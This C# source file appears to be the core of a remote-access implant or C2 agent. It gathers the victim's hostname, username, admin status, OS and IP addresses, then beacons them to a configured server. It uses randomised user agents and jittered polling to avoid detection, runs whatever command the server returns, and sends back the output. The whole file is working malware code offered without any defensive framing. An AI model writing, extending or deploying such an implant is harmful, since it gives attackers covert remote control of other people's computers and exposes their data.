using System;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading;
using Agent;

class Program
{
    static readonly HttpClient _client = new HttpClient
    {
        Timeout = TimeSpan.FromSeconds(30)
    };

    static void Main()
    {
        var info = new SystemInfo();
        var executor = new CommandExecution();
        var rng = new Random();

        _client.DefaultRequestHeaders.Add("X-Session-Id", info.Uuid);
        _client.DefaultRequestHeaders.Add("User-Agent", Config.GetRandomUserAgent());

        string? pendingOutput = null;

        while (true)
        {
            try
            {
                string? cmd = Ping(info, pendingOutput);
                pendingOutput = null;

                if (!string.IsNullOrEmpty(cmd))
                    pendingOutput = executor.Run(cmd);
            }
            catch { }

            Thread.Sleep(Config.GetPollingInterval() + rng.Next(0, Config.GetJitterMax()));
        }
    }

    static string? Ping(SystemInfo info, string? output)
    {
        var body = JsonSerializer.Serialize(new
        {
            info = new
            {
                hostname = info.Hostname,
                username = info.Username,
                is_admin = info.IsAdmin,
                os_version = info.OsVersion,
                arch = info.Machine,
                private_ip = info.IpPriv,
                public_ip = info.IpPub
            },
            output
        });

        using var content = new StringContent(body, Encoding.UTF8, "application/json");
        using var resp = _client.PostAsync(Config.GetServerUrl() + "/ping", content).Result;

        var json = resp.Content.ReadAsStringAsync().Result;
        using var doc = JsonDocument.Parse(json);

        if (doc.RootElement.TryGetProperty("cmd", out var cmd) && cmd.ValueKind != JsonValueKind.Null)
            return cmd.GetString();

        return null;
    }
}